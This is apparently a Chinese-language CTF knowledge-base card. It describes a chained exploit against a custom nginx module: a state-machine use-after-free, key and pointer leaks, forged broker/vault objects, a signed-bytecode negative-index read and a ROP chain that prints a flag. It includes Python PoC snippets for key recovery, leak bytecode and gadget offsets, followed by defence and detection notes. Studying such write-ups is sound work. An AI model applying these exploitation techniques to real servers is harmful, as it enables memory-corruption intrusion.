---
id: ctf-pwn-nginx-module-state-machine-uaf-signed-bytecode-negative-index
title: nginx 模块状态机 UAF → broker/vault 对象图 → 有符号字节码负索引读 → ROP 读 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: nginx-module-state-machine-uaf-signed-bytecode-index
aliases:
- cacheline
- nginx 模块漏洞
- 状态机悬空指针
- broker/vault 对象图
- 有符号字节码索引
- 负数 root 相对读
- lea rsp,[rdi+0x40]
tags:
- ctf
- pwn
- nginx
- module
- uaf
- state-machine
- bytecode
- signed-char
- type-confusion
- rop
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T02:00:06+08:00'
  notes: 已对照原文核对；cacheline 状态机悬空指针、beacon/ledger 密钥泄露、vault 负索引读 root、plan+0x40 指向 lea rsp 跳板与 read/write ROP 一致
---

## 一句话结论

nginx worker 的 `cacheline.so` 模块用 HTTP `op/data` 参数驱动一个 create/resize/ledgeropen/beacon/ledger/route/seal/grant/voucher/commit 状态机，并把请求池中已释放的对象保存为全局悬空指针；beacon/ledger 阶段泄露模块 PIE、每个 worker 的密钥与连接对象指针，commit 置位后启动 broker 中继；broker 泄露代理函数与两个全局密钥后伪造许可/授权/分片，把调用目标引到 vault 入口；vault 的字节码解释器用有符号 char 与 64 位累加器处理立即数，负立即数被当作 root 对象的 qword 索引，`-3/-2/-1` 分别泄露中间值、根指针与 vault PIE；据此计算四把根密钥与第二阶段密码、伪造 12 个对象，把计划对象偏移 0x40 的指针指向 `lea rsp,[rdi+0x40]; ret` 跳板，再用四个分片载荷拼成 ROP，`read(7,.bss,0x100)` 后 `write(1,...)` 把 flag 打到连接。

## 原理

- **模块与状态机**：nginx worker 通过 `cacheline.so` 处理 HTTP 请求，参数为操作与数据，远程挂载点不是根路径而是缓存路径；模块后面是 uid 1001 的 broker 与 uid 1002 的 vault，两者通过 unix socket 通信。模块内部是一个状态机，依次经过创建、调整大小、打开账本、信标与账本、路由、封存、授权、凭证与提交。
- **UAF 根因**：状态机把请求池中已经释放的对象保存为全局悬空指针；单个操作只是越界读写，但按状态机顺序组合后，悬空对象就变成可控的调用目标。
- **第一层泄露**：信标与账本阶段可以泄露模块 PIE 基址、每个 worker 的密钥以及连接对象指针；提交阶段使用判别值 1 会启动 broker 中继。
- **第二层 broker**：broker 的读操作可以泄露代理函数地址与两个全局指针，回显的 cookie 可以恢复堆指针；伪造许可、授权与四组分片之后，计算出的调用目标会被引导到 vault 的入口代理函数。
- **第三层 vault 类型混淆**：vault 的字节码解释器用有符号 char 与 64 位累加器处理立即数；通过检查后，负的立即数会被当作相对根对象的四字索引读取。利用 `-3`、`-2`、`-1` 可以分别泄露中间值、根指针与 vault 的 PIE 基址。解释器程序形态为 `A(-3); y; A(index+3); S; 0x8B`：第一次 `A` 的有符号检查只约束第一遍在 `<=23`，`y` 之后的负增量可到达任意 root 相对 qword。
- **密钥与对象伪造**：有了泄露即可计算四把根密钥与第二阶段密码，伪造 12 个对象；把计划对象偏移 `0x40` 处的指针指向 `base+0x44e0` 的 `lea rsp,[rdi+0x40]; ret` 跳板。
- **ROP**：四个分片载荷拼成 ROP 栈，`read(7, .bss, 0x100)` 后 `write(1, .bss, 0x100)`，把 flag 打印到连接上。

## 触发条件

- 目标 nginx 加载了存在状态机悬空指针的模块，HTTP 参数可驱动完整状态机。
- 信标/账本阶段返回可用于恢复 PIE/密钥/连接指针的字段，且 commit 可启动 broker 中继。
- broker 提供代理函数与全局密钥泄露，许可/授权/分片字段可伪造（哈希可计算）。
- vault 字节码解释器存在有符号立即数/负索引类型混淆，且可构造读取 root 相对 qword 的程序。
- 计划/凭证/上下文/分片等对象结构可伪造，ROP 目标（`lea rsp,[rdi+0x40]; ret`）与 read/write PLT 可用。

## 利用步骤

1. 通过 HTTP `create`/`resize` 反复尝试，直到 `resize` 复用已释放的 384 字节块（`staged`）；`ledgeropen` 后调用 `beacon`/`ledger`，解析 `n/a/e/k` 与 `n/o/t` 字段。
2. 按公式恢复 `P`、`K2`、`K1`、`conn` 并验证哈希；依次发送 `route`/`seal`/`grant`/`voucher`（带正确 MAG 与哈希），最后 `commit` 得到 `activated`，broker 中继启动。
3. 进入 broker：`N/L/n/l/B/P/p/A/a/V` 探测泄露 `sub_4000`、`K1`、`K2`；`G/M/H/O/I/Q/S/s/T/t/E/U/u/F/f` 伪造许可、授权与四组分片，发送 `C` 提交把连接转给 vault。
4. 进入 vault：用 op1 字节码程序泄露 `-3/-2/-1`，得到 `v6`、root 指针、`sub_17F0` 与 PIE；计算 `KA/KB/k232` 与第二阶段密码，发送 op2 通过认证。
5. 创建 ticket/cred/ctx/plan/4 shard/4 seal，恢复各对象指针；伪造 ticket/credential/context/plan 与 shard/seal 的哈希，plan+0x40 指向 `base+0x44e0`。
6. 用四个 256 字节分片承载 ROP（`pop rdi=7; pop rsi=BUF; pop rdx=0x100; read; pop rdi=1; ... write`），导入对象后 `final(64,...)` 触发，读取 flag。

## PoC

模块层密钥恢复（原文公式）：

```python
P = a ^ rol(r, 17)
K2 = e ^ H(P, r, [r, P], 2)
K1 = k ^ H(P, r, [K2, r], 2)
conn = o ^ H(K1, K2, [ln, r], 2)
assert t == H(K1, K2, [conn, P, r, ln], 4)
```

vault 负索引泄露程序（op1 字节码）：

```python
def make_insn(i, op, arg=0, imm=0):
    w0 = (op & 0xff) | ((arg & 0xff) << 8)
    rol = ((w0 << 8) | (w0 >> 8)) & 0xffff
    ck = ((rol ^ (109 * i)) ^ 0x4b27) & 0xffff
    return bytes([op, arg & 0xff]) + struct.pack("<H", ck) + b"\x00" * 4 + struct.pack("<Q", imm)

# A(-3); y; A(index+3); S; 0x8B
prog = (make_insn(0, ord("A"), 0xfd) + make_insn(1, ord("y")) +
        make_insn(2, ord("A"), (index + 3) & 0xff) +
        make_insn(3, ord("S")) + make_insn(4, 0x8b))
```

最终 ROP（节选）：

```python
pivot   = base + 0x44e0      # lea rsp,[rdi+0x40]; ret
pop_rdi = base + 0x44f0
pop_rsi = base + 0x4500
pop_rdx = base + 0x4510
read_plt, write_plt = base + 0x10e0, base + 0x10a0
BUF = base + 0x7300
raw = [pop_rdi, 7, pop_rsi, BUF, pop_rdx, 0x100, read_plt,
       pop_rdi, 1, pop_rsi, BUF, pop_rdx, 0x100, write_plt]
```

## 变体与关联

- 状态机悬空指针可换成引用计数/生命周期错误、pool cleanup 顺序错误、异步回调持有已释放请求。
- 字节码负索引可换成有符号 char 比较、`int8_t` 立即数、`base + index*8` 无上下界等；核心是“检查用有符号、寻址用无符号/反之”。
- ROP 跳板可换成 `setcontext`、`leave; ret`、`xchg rsp, rax`；若 seccomp 限制 read/write，可用 openat/read/write 或已打开的 flag fd。
- 关联：nginx 模块 UAF、字节码 VM 类型混淆、多阶段对象图伪造、ROP 卡。

## 检测与防御

- 模块状态机必须严格管理请求池对象生命周期，释放后从全局状态移除；异步阶段使用引用计数/弱引用。
- HTTP `op/data` 参数做长度/类型/状态校验，禁止跨状态直接调用；broker/vault 之间的代理调用做认证与来源校验。
- 字节码解释器对立即数做有符号/无符号统一范围检查，负索引直接拒绝；对象/分片结构加哈希与长度校验。
- nginx worker 最小权限，模块与 broker/vault 隔离；seccomp 限制 read/write/open 目标。
- 检测：同一连接连续调用 create/resize/ledgeropen/beacon/ledger 的异常序列；`commit v39=1` 后连接切换到 broker 协议；vault 字节码中出现负立即数；worker 进程异常 read(7)/write(1)。
